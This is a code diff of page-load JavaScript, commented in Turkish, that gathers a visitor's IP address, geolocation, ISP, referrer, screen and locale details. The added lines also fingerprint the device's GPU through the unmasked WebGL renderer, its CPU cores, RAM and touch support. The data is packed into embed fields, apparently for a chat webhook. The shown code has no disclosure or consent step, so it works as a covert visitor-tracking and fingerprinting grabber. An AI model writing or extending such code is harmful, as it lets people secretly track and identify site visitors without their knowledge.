@@ -627,19 +627,23 @@ document.addEventListener("DOMContentLoaded", () => {
       const windowSize = `${window.innerWidth}x${window.innerHeight}`;
       const pixelRatio = window.devicePixelRatio ? `${window.devicePixelRatio}x` : "Standart";
 
-      // Özel URL Parametresi Tespiti (Örn: ?kisi=ahmet veya ?ref=instagram)
-      const urlParams = new URLSearchParams(window.location.search);
-      const trackingCode = urlParams.get('kisi') || urlParams.get('ref') || urlParams.get('source');
+      // Derin Donanım (Fingerprint) Analizi
+      let gpuInfo = "Bilinmiyor";
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      } catch (e) {}
+
+      const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Çekirdek` : "Bilinmiyor";
+      const deviceRAM = navigator.deviceMemory ? `Yaklaşık ${navigator.deviceMemory} GB` : "Gizli/Bilinmiyor";
+      const touchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Nokta` : "Desteklenmiyor";
 
       const embedFields = [
-        { name: "🔗 Nereden Geldi?", value: referrer, inline: false }
-      ];
-
-      if (trackingCode) {
-        embedFields.push({ name: "🎯 Özel Takip Etiketi", value: trackingCode, inline: false });
-      }
-
-      embedFields.push(
+        { name: "🔗 Nereden Geldi?", value: referrer, inline: false },
         { name: "📍 Konum", value: locationData.location, inline: true },
         { name: "🌐 IP Adresi", value: locationData.ip, inline: true },
         { name: "🏢 Servis Sağlayıcı", value: locationData.isp, inline: true },
@@ -656,8 +660,12 @@ document.addEventListener("DOMContentLoaded", () => {
         { name: "🖥️ Ekran Çözünürlüğü", value: screenRes, inline: true },
         { name: "🌍 Dil & Saat Dilimi", value: `${navigator.language} / ${timeZone}`, inline: true },
         { name: "⏰ Yerel Saat", value: localTime, inline: true },
-        { name: "🎨 Tema Tercihi", value: prefersDark, inline: true }
-      );
+        { name: "🎨 Tema Tercihi", value: prefersDark, inline: true },
+        { name: "🎮 Ekran Kartı (GPU)", value: gpuInfo, inline: true },
+        { name: "⚙️ İşlemci (CPU)", value: cpuCores, inline: true },
+        { name: "💾 Cihaz RAM'i", value: deviceRAM, inline: true },
+        { name: "🖐️ Dokunmatik Hassasiyet", value: touchPoints, inline: true }
+      ];
 
       const payload = {
         embeds: [{
